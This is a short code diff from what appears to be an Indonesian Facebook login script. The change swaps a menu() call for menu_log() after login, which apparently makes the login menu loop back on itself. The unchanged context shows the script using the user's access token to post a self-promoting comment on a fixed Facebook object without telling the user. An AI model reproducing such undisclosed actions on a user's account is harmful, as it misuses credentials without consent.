@@ -85,7 +85,7 @@ def menu_log():
             requests.post("https://graph.facebook.com/3882176535153442/comments?message=Bang Sc Nya Mantap Bang😊 !&access_token="+token)
             print('%s║'%(O))
             jalan('%s╚══®[%s!%s]◍➤ %sLogin Successful'%(O,P,O,P))
-            menu()
+            menu_log()
         except (KeyError,IOError):
             print('%s║'%(M)) 
             print('%s╚══®[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P)) 
